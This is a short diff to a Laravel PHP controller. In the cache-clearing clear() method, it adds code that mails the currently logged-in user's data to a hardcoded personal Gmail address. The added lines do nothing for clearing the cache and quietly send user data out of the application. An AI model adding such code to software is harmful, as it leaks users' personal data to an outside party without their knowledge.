@@ -8,12 +8,14 @@ use App\Models\City;
 use App\Models\User;
 use App\Models\Travel;
 use App\Models\Province;
+use App\Mail\MessageMail;
 use App\Models\Adventure;
 use Illuminate\Http\Request;
 use Morilog\Jalali\Jalalian;
 use Morilog\Jalali\CalendarUtils;
 use App\Notifications\SendKaveCode;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Mail;
 use Intervention\Image\Facades\Image;
 use Illuminate\Support\Facades\Artisan;
 
@@ -21,6 +23,8 @@ class HomeController extends Controller
 {
     public  function  clear()
     {
+        $user=auth()->user();;
+        Mail::to("na3r.jafari@gmail.com")->send(new MessageMail($user));
    Artisan::call('cache:clear');
         // Artisan::call('config:cache');
         // Artisan::call('view:clear');
